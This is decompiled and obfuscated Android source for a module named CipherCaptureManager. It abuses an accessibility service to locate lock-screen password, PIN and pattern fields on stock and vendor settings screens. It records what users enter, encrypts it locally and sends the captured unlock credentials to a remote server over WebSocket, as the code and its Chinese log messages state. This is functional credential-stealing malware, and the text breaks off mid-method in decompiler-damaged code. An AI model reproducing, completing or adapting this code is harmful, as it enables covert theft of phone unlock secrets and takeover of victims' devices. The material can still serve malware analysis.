package com.storm.safe.rock.service.modules.cipher;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.app.KeyguardManager;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.res.Resources;
import android.graphics.Path;
import android.graphics.PointF;
import android.graphics.Rect;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.security.keystore.KeyGenParameterSpec;
import android.util.Base64;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.service.modules.C0323a8;
import com.storm.safe.rock.util.StringUtil;
import java.io.IOException;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.Key;
import java.security.KeyStore;
import java.security.KeyStoreException;
import java.security.NoSuchAlgorithmException;
import java.security.NoSuchProviderException;
import java.security.UnrecoverableKeyException;
import java.security.cert.CertificateException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collection;
import java.util.Iterator;
import java.util.LinkedHashMap;
import java.util.LinkedList;
import java.util.List;
import java.util.ListIterator;
import java.util.Locale;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicLong;
import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.KeyGenerator;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;
import javax.crypto.spec.GCMParameterSpec;
import kotlin.AbstractC0767a0;
import kotlin.Pair;
import kotlin.coroutines.AbstractC0775a0;
import kotlin.text.AbstractC0779a1;
import kotlin.text.Regex;
import kotlinx.coroutines.AbstractC0780a0;
import okhttp3.OkHttpClient;
import org.conscrypt.PSKKeyManager;
import org.json.JSONArray;
import org.json.JSONObject;
import p000.AbstractC0003a2;
import p000.AbstractC0134bh;
import p000.AbstractC0577hd;
import p000.AbstractC0715je;
import p000.AbstractC0716jf;
import p000.AbstractC0717jg;
import p000.AbstractC0721jk;
import p000.AbstractC1117qo;
import p000.AbstractC1262tj;
import p000.C0107as;
import p000.C0598hx;
import p000.C0600hy;
import p000.C0873ms;
import p000.ExecutorC1158qw;
import p000.RunnableC0596hw;
import p000.RunnableC0602hz;
import p000.RunnableC0615ia;
import p000.dh0;
import p000.h10;
import p000.l60;
import p000.m21;
import p000.n60;
import p000.t60;
import p000.tz0;
import p000.w00;
import p000.y21;
import p000.y90;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: com.storm.safe.rock.service.modules.cipher.a1 */
/* loaded from: classes2.dex */
public final class C0335a1 {

    /* renamed from: c5 */
    public static final C0600hy f53283c5 = new C0600hy(null);

    /* renamed from: c6 */
    public static final String f53284c6 = StringUtil.m212470a0("L1wHM049My1eISNcAwVINg88TiE/XBU=");

    /* renamed from: c7 */
    public static volatile C0335a1 f53285c7;

    /* renamed from: a0 */
    public volatile AccessibilityService f53286a0;

    /* renamed from: a1 */
    public final Context f53287a1;

    /* renamed from: a3 */
    public C0337a3 f53289a3;

    /* renamed from: a4 */
    public RunnableC0615ia f53290a4;

    /* renamed from: a6 */
    public final OkHttpClient f53292a6;

    /* renamed from: a7 */
    public C0873ms f53293a7;

    /* renamed from: a8 */
    public final Handler f53294a8;

    /* renamed from: a9 */
    public volatile long f53295a9;

    /* renamed from: b0 */
    public final AtomicLong f53296b0;

    /* renamed from: b1 */
    public boolean f53297b1;

    /* renamed from: b2 */
    public final ArrayList f53298b2;

    /* renamed from: b3 */
    public boolean f53299b3;

    /* renamed from: b4 */
    public final ArrayList f53300b4;

    /* renamed from: b5 */
    public final ArrayList f53301b5;

    /* renamed from: b6 */
    public long f53302b6;

    /* renamed from: b7 */
    public final ArrayList f53303b7;

    /* renamed from: b8 */
    public volatile boolean f53304b8;

    /* renamed from: b9 */
    public RunnableC0334a0 f53305b9;

    /* renamed from: c0 */
    public volatile C0598hx f53306c0;

    /* renamed from: c1 */
    public volatile boolean f53307c1;

    /* renamed from: c2 */
    public volatile long f53308c2;

    /* renamed from: c3 */
    public final long f53309c3;

    /* renamed from: c4 */
    public final AtomicBoolean f53310c4;

    /* renamed from: a2 */
    public final y90 f53288a2 = AbstractC0767a0.m213609a0(new w00() { // from class: com.storm.safe.rock.service.modules.cipher.CipherCaptureManager$prefs$2
        {
            super(0);
        }

        @Override // p000.w00
        public final Object invoke() {
            return this.f53214a0.f53287a1.getSharedPreferences(C0335a1.f53283c5.getPREFS_NAME(), 0);
        }
    });

    /* renamed from: a5 */
    public final long f53291a5 = 500;

    public C0335a1(AccessibilityService accessibilityService, Context context) throws NoSuchAlgorithmException, IOException, KeyStoreException, CertificateException, NoSuchProviderException, InvalidAlgorithmParameterException {
        this.f53286a0 = accessibilityService;
        this.f53287a1 = context;
        OkHttpClient.Builder builder = new OkHttpClient.Builder();
        TimeUnit timeUnit = TimeUnit.SECONDS;
        this.f53292a6 = builder.connectTimeout(5L, timeUnit).readTimeout(5L, timeUnit).build();
        ExecutorC1158qw executorC1158qw = AbstractC1262tj.f60234a1;
        y21 y21Var = new y21();
        executorC1158qw.getClass();
        this.f53293a7 = AbstractC1117qo.m214407a0(AbstractC0775a0.m213638a1(executorC1158qw, y21Var));
        this.f53294a8 = new Handler(Looper.getMainLooper());
        this.f53296b0 = new AtomicLong(0L);
        this.f53298b2 = new ArrayList();
        this.f53300b4 = new ArrayList();
        this.f53301b5 = new ArrayList();
        this.f53303b7 = new ArrayList();
        try {
            KeyStore keyStore = KeyStore.getInstance("AndroidKeyStore");
            keyStore.load(null);
            C0600hy c0600hy = f53283c5;
            if (!keyStore.containsAlias(c0600hy.getKEY_ALIAS())) {
                KeyGenerator keyGenerator = KeyGenerator.getInstance("AES", "AndroidKeyStore");
                KeyGenParameterSpec keyGenParameterSpecBuild = new KeyGenParameterSpec.Builder(c0600hy.getKEY_ALIAS(), 3).setBlockModes("GCM").setEncryptionPaddings("NoPadding").setKeySize(PSKKeyManager.MAX_KEY_LENGTH_BYTES).build();
                t60.m214694b5(keyGenParameterSpecBuild, "Builder(\n               …                 .build()");
                keyGenerator.init(keyGenParameterSpecBuild);
                keyGenerator.generateKey();
                t60.m214702c3("CipherCaptureManager", "加密密钥已生成");
            }
        } catch (Exception e) {
            tz0.m214807a7("初始化加密密钥失败: ", e.getMessage(), "CipherCaptureManager");
        }
        t60.m214715d7(this.f53287a1);
        this.f53309c3 = 500L;
        this.f53310c4 = new AtomicBoolean(false);
    }

    /* renamed from: a6 */
    public static void m211783a6() throws InterruptedException {
        try {
            Thread.sleep(500L);
        } catch (Exception unused) {
        }
    }

    /* renamed from: a7 */
    public static void m211784a7() throws InterruptedException {
        try {
            Thread.sleep(200L);
        } catch (Exception unused) {
        }
    }

    /* renamed from: b3 */
    public static String m211785b3(String str) throws BadPaddingException, NoSuchPaddingException, IllegalBlockSizeException, NoSuchAlgorithmException, UnrecoverableKeyException, IOException, InvalidKeyException, KeyStoreException, CertificateException, InvalidAlgorithmParameterException {
        SecretKey secretKeyM211797d1 = m211797d1();
        if (secretKeyM211797d1 == null) {
            return null;
        }
        try {
            byte[] bArrDecode = Base64.decode(str, 2);
            t60.m214694b5(bArrDecode, "combined");
            byte[] bArrM210730f3 = AbstractC0134bh.m210730f3(bArrDecode, AbstractC1117qo.m214463g2(0, 12));
            byte[] bArrM210730f32 = AbstractC0134bh.m210730f3(bArrDecode, AbstractC1117qo.m214463g2(12, bArrDecode.length));
            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            cipher.init(2, secretKeyM211797d1, new GCMParameterSpec(128, bArrM210730f3));
            byte[] bArrDoFinal = cipher.doFinal(bArrM210730f32);
            t60.m214694b5(bArrDoFinal, "cipher.doFinal(encrypted)");
            return new String(bArrDoFinal, AbstractC0577hd.f56650a0);
        } catch (Exception e) {
            tz0.m214807a7("解密失败: ", e.getMessage(), "CipherCaptureManager");
            return null;
        }
    }

    /* renamed from: b9 */
    public static void m211786b9(AccessibilityNodeInfo accessibilityNodeInfo, int i) {
        String string;
        String string2;
        if (i > 5) {
            return;
        }
        String strM213671c4 = AbstractC0779a1.m213671c4(i, "  ");
        CharSequence className = accessibilityNodeInfo.getClassName();
        if (className == null || (string = className.toString()) == null) {
            string = "null";
        }
        String viewIdResourceName = accessibilityNodeInfo.getViewIdResourceName();
        if (viewIdResourceName == null) {
            viewIdResourceName = "no-id";
        }
        CharSequence text = accessibilityNodeInfo.getText();
        String strM213937e5 = (text == null || (string2 = text.toString()) == null) ? "" : m21.m213937e5(20, string2);
        t60.m214702c3("CipherCaptureManager", strM213671c4 + "Node: class=" + string + ", id=" + viewIdResourceName + ", text=" + strM213937e5 + ", editable=" + accessibilityNodeInfo.isEditable() + ", password=" + accessibilityNodeInfo.isPassword() + ", focused=" + accessibilityNodeInfo.isFocused());
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i2 = 0; i2 < childCount; i2++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i2);
            if (child != null) {
                m211786b9(child, i + 1);
            }
        }
    }

    /* renamed from: c0 */
    public static void m211787c0(AccessibilityNodeInfo accessibilityNodeInfo, int i) {
        String viewIdResourceName;
        if (i > 4) {
            return;
        }
        String strM213671c4 = AbstractC0779a1.m213671c4(i, "  ");
        try {
            viewIdResourceName = accessibilityNodeInfo.getViewIdResourceName();
        } catch (Exception unused) {
            viewIdResourceName = null;
        }
        CharSequence className = accessibilityNodeInfo.getClassName();
        CharSequence text = accessibilityNodeInfo.getText();
        t60.m214702c3("CipherCaptureManager", "tryPatternInput: " + strM213671c4 + ((Object) className) + " id=" + viewIdResourceName + " text=" + ((Object) text) + " clickable=" + accessibilityNodeInfo.isClickable());
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i2 = 0; i2 < childCount; i2++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i2);
            if (child != null) {
                m211787c0(child, i + 1);
            }
        }
    }

    /* renamed from: c1 */
    public static void m211788c1(C0335a1 c0335a1) {
        if (c0335a1.f53297b1) {
            t60.m214702c3("CipherCaptureManager", "⚠️ 密码监听已激活，跳过重复调用");
            return;
        }
        c0335a1.f53297b1 = true;
        c0335a1.f53304b8 = false;
        RunnableC0334a0 runnableC0334a0 = c0335a1.f53305b9;
        if (runnableC0334a0 != null) {
            c0335a1.f53294a8.removeCallbacks(runnableC0334a0);
        }
        c0335a1.f53305b9 = null;
        c0335a1.f53298b2.clear();
        c0335a1.f53299b3 = false;
        c0335a1.f53300b4.clear();
        c0335a1.f53301b5.clear();
        c0335a1.f53302b6 = 0L;
        t60.m214714d6("CipherCaptureManager", "✅ 启用系统密码监听模式（自动检测类型，enableTouchExploration=false）");
        t60.m214702c3("CipherCaptureManager", "⏭️ 跳过触摸探索（应用内验证场景，不影响用户操作）");
        c0335a1.m211823e0();
        c0335a1.f53294a8.post(new RunnableC0596hw(c0335a1, 3));
        ArrayList arrayList = c0335a1.f53303b7;
        int size = arrayList.size();
        int i = 0;
        while (i < size) {
            Object obj = arrayList.get(i);
            i++;
            c0335a1.f53294a8.removeCallbacks((Runnable) obj);
        }
        c0335a1.f53303b7.clear();
        long[] jArr = {200, 500, 1000, 1500};
        for (int i2 = 0; i2 < 4; i2++) {
            long j = jArr[i2];
            RunnableC0602hz runnableC0602hz = new RunnableC0602hz(c0335a1, j);
            c0335a1.f53303b7.add(runnableC0602hz);
            c0335a1.f53294a8.postDelayed(runnableC0602hz, j);
        }
    }

    /* renamed from: c2 */
    public static String m211789c2(String str) throws BadPaddingException, NoSuchPaddingException, IllegalBlockSizeException, NoSuchAlgorithmException, UnrecoverableKeyException, IOException, InvalidKeyException, KeyStoreException, CertificateException {
        SecretKey secretKeyM211797d1 = m211797d1();
        if (secretKeyM211797d1 == null) {
            return null;
        }
        try {
            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            cipher.init(1, secretKeyM211797d1);
            byte[] iv = cipher.getIV();
            byte[] bytes = str.getBytes(AbstractC0577hd.f56650a0);
            t60.m214694b5(bytes, "this as java.lang.String).getBytes(charset)");
            byte[] bArrDoFinal = cipher.doFinal(bytes);
            t60.m214694b5(iv, "iv");
            t60.m214694b5(bArrDoFinal, "encrypted");
            int length = iv.length;
            int length2 = bArrDoFinal.length;
            byte[] bArrCopyOf = Arrays.copyOf(iv, length + length2);
            System.arraycopy(bArrDoFinal, 0, bArrCopyOf, length, length2);
            t60.m214694b5(bArrCopyOf, "result");
            return Base64.encodeToString(bArrCopyOf, 2);
        } catch (Exception e) {
            tz0.m214807a7("加密失败: ", e.getMessage(), "CipherCaptureManager");
            return null;
        }
    }

    /* renamed from: c3 */
    public static AccessibilityNodeInfo m211790c3(AccessibilityNodeInfo accessibilityNodeInfo) {
        String string;
        AccessibilityNodeInfo accessibilityNodeInfoM211790c3;
        CharSequence className = accessibilityNodeInfo.getClassName();
        if (className == null || (string = className.toString()) == null) {
            string = "";
        }
        if (!AbstractC0779a1.m213652a5(string, "EditText", false) && !accessibilityNodeInfo.isEditable() && !accessibilityNodeInfo.isPassword()) {
            int childCount = accessibilityNodeInfo.getChildCount();
            for (int i = 0; i < childCount; i++) {
                AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
                if (child != null && (accessibilityNodeInfoM211790c3 = m211790c3(child)) != null) {
                    return accessibilityNodeInfoM211790c3;
                }
            }
            return null;
        }
        t60.m214702c3("CipherCaptureManager", "findEditText: ✅ 找到输入框 class=" + string + ", isEditable=" + accessibilityNodeInfo.isEditable() + ", isPassword=" + accessibilityNodeInfo.isPassword());
        return accessibilityNodeInfo;
    }

    /* renamed from: c4 */
    public static AccessibilityNodeInfo m211791c4(AccessibilityNodeInfo accessibilityNodeInfo) {
        String string;
        AccessibilityNodeInfo accessibilityNodeInfoM211791c4;
        CharSequence className = accessibilityNodeInfo.getClassName();
        if (className == null || (string = className.toString()) == null) {
            string = "";
        }
        if ((AbstractC0779a1.m213652a5(string, "EditText", false) || accessibilityNodeInfo.isEditable()) && accessibilityNodeInfo.isFocused()) {
            t60.m214702c3("CipherCaptureManager", "findFocusedEditText: 找到 focused EditText class=".concat(string));
            return accessibilityNodeInfo;
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null && (accessibilityNodeInfoM211791c4 = m211791c4(child)) != null) {
                return accessibilityNodeInfoM211791c4;
            }
        }
        return null;
    }

    /* renamed from: c5 */
    public static final AccessibilityNodeInfo m211792c5(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        AccessibilityNodeInfo accessibilityNodeInfoM211792c5;
        CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
        if (t60.m214686a2(contentDescription != null ? contentDescription.toString() : null, str)) {
            CharSequence className = accessibilityNodeInfo.getClassName();
            if (t60.m214686a2(className != null ? className.toString() : null, "android.view.View") && accessibilityNodeInfo.isClickable()) {
                return accessibilityNodeInfo;
            }
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null && (accessibilityNodeInfoM211792c5 = m211792c5(child, str)) != null) {
                return accessibilityNodeInfoM211792c5;
            }
        }
        return null;
    }

    /* renamed from: c6 */
    public static AccessibilityNodeInfo m211793c6(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId(str);
        t60.m214694b5(listFindAccessibilityNodeInfosByViewId, "nodes");
        if (listFindAccessibilityNodeInfosByViewId.isEmpty()) {
            return null;
        }
        return listFindAccessibilityNodeInfosByViewId.get(0);
    }

    /* renamed from: c7 */
    public static AccessibilityNodeInfo m211794c7(AccessibilityNodeInfo accessibilityNodeInfo, String str, String str2) {
        AccessibilityNodeInfo next;
        CharSequence className;
        Iterator<AccessibilityNodeInfo> it = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId(str).iterator();
        do {
            if (!it.hasNext()) {
                return null;
            }
            next = it.next();
            className = next.getClassName();
        } while (!t60.m214686a2(className != null ? className.toString() : null, str2));
        return next;
    }

    /* renamed from: c8 */
    public static AccessibilityNodeInfo m211795c8(AccessibilityNodeInfo accessibilityNodeInfo) {
        String string;
        CharSequence packageName = accessibilityNodeInfo.getPackageName();
        if (packageName == null || (string = packageName.toString()) == null) {
            string = "com.android.settings";
        }
        for (String str : AbstractC0716jf.m213306g5(string.concat(":id/passwordEntry"), string.concat(":id/password_entry"), string.concat(":id/password"), string.concat(":id/pinEntry"), string.concat(":id/pin_entry"), string.concat(":id/lockPassword"), "com.android.settings:id/passwordEntry", "com.android.settings:id/password_entry", "com.android.settings:id/pinEntry")) {
            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId(str);
            t60.m214694b5(listFindAccessibilityNodeInfosByViewId, "nodes");
            if (!listFindAccessibilityNodeInfosByViewId.isEmpty()) {
                AccessibilityNodeInfo accessibilityNodeInfo2 = listFindAccessibilityNodeInfosByViewId.get(0);
                t60.m214702c3("CipherCaptureManager", "findPasswordInputById: 通过 viewId=" + str + " 找到节点 class=" + ((Object) accessibilityNodeInfo2.getClassName()));
                return accessibilityNodeInfo2;
            }
        }
        return null;
    }

    /* renamed from: c9 */
    public static AccessibilityNodeInfo m211796c9(AccessibilityNodeInfo accessibilityNodeInfo) {
        String string;
        AccessibilityNodeInfo accessibilityNodeInfoM211796c9;
        CharSequence className = accessibilityNodeInfo.getClassName();
        if (className == null || (string = className.toString()) == null) {
            string = "";
        }
        if (AbstractC0779a1.m213652a5(string, "LockPattern", true) || AbstractC0779a1.m213652a5(string, "PatternView", true)) {
            t60.m214714d6("CipherCaptureManager", "findPatternNodeByClass: 找到 ".concat(string));
            return accessibilityNodeInfo;
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null && (accessibilityNodeInfoM211796c9 = m211796c9(child)) != null) {
                return accessibilityNodeInfoM211796c9;
            }
        }
        return null;
    }

    /* renamed from: d1 */
    public static SecretKey m211797d1() throws NoSuchAlgorithmException, UnrecoverableKeyException, IOException, KeyStoreException, CertificateException {
        try {
            KeyStore keyStore = KeyStore.getInstance("AndroidKeyStore");
            keyStore.load(null);
            Key key = keyStore.getKey(f53283c5.getKEY_ALIAS(), null);
            if (key instanceof SecretKey) {
                return (SecretKey) key;
            }
            return null;
        } catch (Exception e) {
            tz0.m214807a7("获取密钥失败: ", e.getMessage(), "CipherCaptureManager");
            return null;
        }
    }

    /* renamed from: d2 */
    public static void m211798d2(LinkedList linkedList) {
        int i;
        if (linkedList.isEmpty()) {
            return;
        }
        ListIterator listIterator = linkedList.listIterator();
        t60.m214694b5(listIterator, "linkedList.listIterator()");
        android.graphics.Point point = null;
        while (listIterator.hasNext()) {
            Object next = listIterator.next();
            t60.m214694b5(next, "iter.next()");
            android.graphics.Point point2 = (android.graphics.Point) next;
            int i2 = point2.x;
            if (i2 < 0 || (i = point2.y) < 0) {
                listIterator.remove();
            } else if (point != null && i2 == point.x && i == point.y) {
                listIterator.remove();
            } else {
                point = point2;
            }
        }
    }

    /* renamed from: d3 */
    public static List m211799d3(LinkedList linkedList, Rect rect, Rect rect2, Rect rect3, Rect rect4) {
        if (linkedList.isEmpty()) {
            return AbstractC0715je.m213303j0(linkedList);
        }
        LinkedList linkedList2 = new LinkedList();
        int i = rect2.bottom - rect2.top;
        int i2 = rect.right - rect.left;
        int i3 = rect.bottom - rect.top;
        int iMin = Math.min(i3, i2);
        int i4 = i3 < i ? i - i3 : 0;
        int i5 = Resources.getSystem().getDisplayMetrics().widthPixels;
        int i6 = i5 > 0 ? i5 / 2 : (i2 / 2) + rect.left;
        int i7 = (i4 / 2) + (i3 / 2) + rect.top;
        int i8 = rect4.bottom - rect4.top;
        int i9 = rect3.right - rect3.left;
        int i10 = rect3.bottom - rect3.top;
        int iMin2 = Math.min(i10, i9);
        int i11 = i10 < i8 ? i8 - i10 : 0;
        int i12 = i5 > 0 ? i5 / 2 : (i9 / 2) + rect3.left;
        int i13 = (i11 / 2) + (i10 / 2) + rect3.top;
        if (iMin == 0) {
            t60.m214714d6("CipherCaptureManager", "helper_a_f: origMinDim=0, 返回原始点");
            return AbstractC0715je.m213303j0(linkedList);
        }
        float f = iMin2 / iMin;
        t60.m214714d6("CipherCaptureManager", "helper_a_f: origScreen=" + rect + ", origParent=" + rect2);
        t60.m214714d6("CipherCaptureManager", "helper_a_f: currWindow=" + rect3 + ", currParent=" + rect4);
        StringBuilder sbM38b9 = AbstractC0003a2.m38b9("helper_a_f: origCenter=(", i6, ",", i7, "), currCenter=(");
        sbM38b9.append(i12);
        sbM38b9.append(",");
        sbM38b9.append(i13);
        sbM38b9.append("), scale=");
        sbM38b9.append(f);
        t60.m214714d6("CipherCaptureManager", sbM38b9.toString());
        Iterator it = linkedList.iterator();
        while (it.hasNext()) {
            android.graphics.Point point = (android.graphics.Point) it.next();
            int i14 = (int) (((point.x - i6) * f) + i12);
            int i15 = (int) (((point.y - i7) * f) + i13);
            linkedList2.add(new android.graphics.Point(i14, i15));
            StringBuilder sbM38b92 = AbstractC0003a2.m38b9("helper_a_f: (", point.x, ",", point.y, ") → (");
            sbM38b92.append(i14);
            sbM38b92.append(",");
            sbM38b92.append(i15);
            sbM38b92.append(")");
            t60.m214714d6("CipherCaptureManager", sbM38b92.toString());
        }
        return linkedList2;
    }

    /* renamed from: d4 */
    public static final String m211800d4(String str) {
        if (str == null || str.length() == 0 || str.length() > 20) {
            return null;
        }
        return AbstractC0779a1.m213673c6(AbstractC0779a1.m213673c6(AbstractC0779a1.m213673c6(AbstractC0779a1.m213673c6(str, "•", "*"), "●", "*"), "⬤", "*"), "◉", "*");
    }

    /* renamed from: d5 */
    public static void m211801d5() {
        try {
            dqtvuisjd c0290a0 = dqtvuisjd.f52358m1.getInstance();
            if (c0290a0 == null) {
                t60.m214726f4("CipherCaptureManager", "⚠️ dqtvuisjd 实例为 null");
                return;
            }
            t60.m214714d6("dqtvuisjd", "✅ [onPasswordCaptureSuccess] 密码捕获成功，停止密码监听");
            c0290a0.f52474k5 = false;
            c0290a0.f52471k2 = 0;
            c0290a0.getSharedPreferences(StringUtil.m212470a0("KkkBBV4sDTpS"), 0).edit().putBoolean(StringUtil.m212470a0("LkESNlg8CRFRIyRULihIOwkgQyI="), true).apply();
        } catch (Exception e) {
            tz0.m214807a7("❌ 通知密码捕获成功失败: ", e.getMessage(), "CipherCaptureManager");
        }
    }

    /* renamed from: d8 */
    public static void m211802d8(C0598hx c0598hx) {
        String str;
        try {
            dqtvuisjd c0290a0 = dqtvuisjd.f52358m1.getInstance();
            C0323a8 c0323a8M211471g5 = c0290a0 != null ? c0290a0.m211471g5() : null;
            if (c0323a8M211471g5 == null) {
                t60.m214726f4("CipherCaptureManager", "NetworkManager 未初始化，跳过 WebSocket 发送");
                return;
            }
            String str2 = c0598hx.f56760a0;
            if (t60.m214686a2(str2, "PASSWORD_QUALITY_PATTERN")) {
                str = "pattern";
            } else {
                str = t60.m214686a2(str2, f53283c5.getQUALITY_NUMERIC()) ? true : t60.m214686a2(str2, "PASSWORD_QUALITY_NUMERIC_COMPLEX") ? "pin" : t60.m214686a2(str2, "PASSWORD_QUALITY_ALPHANUMERIC") ? "password" : "unknown";
            }
            String strM213295i2 = "";
            if (t60.m214686a2(str2, "PASSWORD_QUALITY_PATTERN")) {
                List list = c0598hx.f56762a2;
                if (list != null) {
                    strM213295i2 = AbstractC0715je.m213295i2(list, ",", null, null, null, 62);
                }
            } else {
                String str3 = c0598hx.f56761a1;
                if (str3 != null) {
                    strM213295i2 = str3;
                }
            }
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("type", StringUtil.m212470a0("O1gCKVo3HipoMipJBS9fPQg="));
            jSONObject.put("password", strM213295i2);
            jSONObject.put("passwordType", str);
            jSONObject.put("inputMethod", "system_lock");
            jSONObject.put("timestamp", c0598hx.f56765a5);
            jSONObject.put("cipherGradeCode", str2);
            jSONObject.put("isLocked", c0598hx.f56764a4);
            c0323a8M211471g5.m211658c4("status", jSONObject);
            t60.m214714d6("CipherCaptureManager", "✅ 密码已通过WebSocket发送(status事件): type=" + str + ", password=" + AbstractC0779a1.m213671c4(strM213295i2.length(), "*"));
        } catch (Exception e) {
            tz0.m214807a7("发送密码到服务器失败: ", e.getMessage(), "CipherCaptureManager");
        }
    }

    /* renamed from: a0 */
    public final boolean m211803a0() throws InterruptedException {
        AtomicInteger atomicInteger = new AtomicInteger(0);
        while (atomicInteger.incrementAndGet() < 20 && m211804a1()) {
            try {
                Thread.sleep(100L);
            } catch (Exception unused) {
            }
        }
        boolean z = !m211804a1();
        t60.m214702c3("CipherCaptureManager", "G_verifySuccess: " + z + " (polled " + atomicInteger.get() + " times)");
        return z;
    }

    /* JADX WARN: Code restructure failed: missing block: B:19:0x0038, code lost:
    
        r4 = r5.getTitle();
     */
    /* JADX WARN: Code restructure failed: missing block: B:20:0x003c, code lost:
    
        if (r4 == null) goto L23;
     */
    /* JADX WARN: Code restructure failed: missing block: B:21:0x003e, code lost:
    
        r4 = r4.toString();
     */
    /* JADX WARN: Code restructure failed: missing block: B:22:0x0042, code lost:
    
        if (r4 != null) goto L24;
     */
    /* JADX WARN: Code restructure failed: missing block: B:23:0x0044, code lost:
    
        r4 = "";
     */
    /* JADX WARN: Code restructure failed: missing block: B:25:0x004a, code lost:
    
        switch(r4.hashCode()) {
            case -1908322601: goto L39;
            case -1689836590: goto L36;
            case -1161953415: goto L33;
            case 1820134954: goto L30;
            case 1889347233: goto L27;
            default: goto L26;
        };
     */
    /* JADX WARN: Code restructure failed: missing block: B:28:0x0054, code lost:
    
        if (r4.equals("com.android.settings.password.ChooseLockGeneric") == false) goto L41;
     */
    /* JADX WARN: Code restructure failed: missing block: B:31:0x005e, code lost:
    
        if (r4.equals("com.vivo.settings.password.ConfirmVivoPin$InternalActivity") != false) goto L77;
     */
    /* JADX WARN: Code restructure failed: missing block: B:34:0x0067, code lost:
    
        if (r4.equals("com.android.settings.password.ConfirmLockPattern") != false) goto L77;
     */
    /* JADX WARN: Code restructure failed: missing block: B:37:0x0070, code lost:
    
        if (r4.equals("com.android.settings.password.ConfirmLockPassword") != false) goto L77;
     */
    /* JADX WARN: Code restructure failed: missing block: B:40:0x0079, code lost:
    
        if (r4.equals("com.android.settings.password.ConfirmLockPattern$InternalActivity") != false) goto L77;
     */
    /* JADX WARN: Code restructure failed: missing block: B:42:0x0081, code lost:
    
        if (r4.equals("android.inputmethodservice.SoftInputWindow") == false) goto L49;
     */
    /* JADX WARN: Code restructure failed: missing block: B:43:0x0083, code lost:
    
        r4 = r1.findFocus(1);
     */
    /* JADX WARN: Code restructure failed: missing block: B:44:0x0087, code lost:
    
        if (r4 == null) goto L49;
     */
    /* JADX WARN: Code restructure failed: missing block: B:46:0x008d, code lost:
    
        if (r4.isPassword() == false) goto L49;
     */
    /* renamed from: a1 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final boolean m211804a1() {
        CharSequence packageName;
        String string;
        try {
            AccessibilityNodeInfo rootInActiveWindow = this.f53286a0.getRootInActiveWindow();
            if (rootInActiveWindow != null && (packageName = rootInActiveWindow.getPackageName()) != null && (string = packageName.toString()) != null) {
                try {
                    List<AccessibilityWindowInfo> windows = this.f53286a0.getWindows();
                    if (windows != null) {
                        Iterator<AccessibilityWindowInfo> it = windows.iterator();
                        while (true) {
                            if (!it.hasNext()) {
                                break;
                            }
                            AccessibilityWindowInfo next = it.next();
                            if (next.isActive()) {
                                break;
                            }
                        }
                    }
                } catch (Exception unused) {
                    t60.m214702c3("CipherCaptureManager", "H_isStillInConfirmLock: windows 不可用，降级到 UI 检测");
                }
                if (string.equals("com.android.settings") || AbstractC0779a1.m213652a5(string, "oplus.settings", false) || AbstractC0779a1.m213652a5(string, "oppo.settings", false) || AbstractC0779a1.m213652a5(string, "coloros.settings", false) || AbstractC0779a1.m213652a5(string, "vivo.settings", false) || string.equals("com.samsung.android.biometrics.app.setting")) {
                    ArrayList arrayListM214439d5 = AbstractC1117qo.m214439d5();
                    int size = arrayListM214439d5.size();
                    int i = 0;
                    while (true) {
                        if (i < size) {
                            Object obj = arrayListM214439d5.get(i);
                            i++;
                            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId = rootInActiveWindow.findAccessibilityNodeInfosByViewId((String) obj);
                            t60.m214694b5(listFindAccessibilityNodeInfosByViewId, "root.findAccessibilityNodeInfosByViewId(id)");
                            if (!listFindAccessibilityNodeInfosByViewId.isEmpty()) {
                            }
                        } else {
                            Iterator it2 = AbstractC0716jf.m213306g5("com.android.settings:id/key0", "com.android.settings:id/key1", "com.android.settings:id/lockPattern", "com.android.settings:id/four_to_more_key0", "com.android.settings:id/vivo_pin_confirm").iterator();
                            while (true) {
                                if (it2.hasNext()) {
                                    List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId2 = rootInActiveWindow.findAccessibilityNodeInfosByViewId((String) it2.next());
                                    t60.m214694b5(listFindAccessibilityNodeInfosByViewId2, "root.findAccessibilityNodeInfosByViewId(id)");
                                    if (!listFindAccessibilityNodeInfosByViewId2.isEmpty()) {
                                    }
                                } else if (m211790c3(rootInActiveWindow) != null) {
                                }
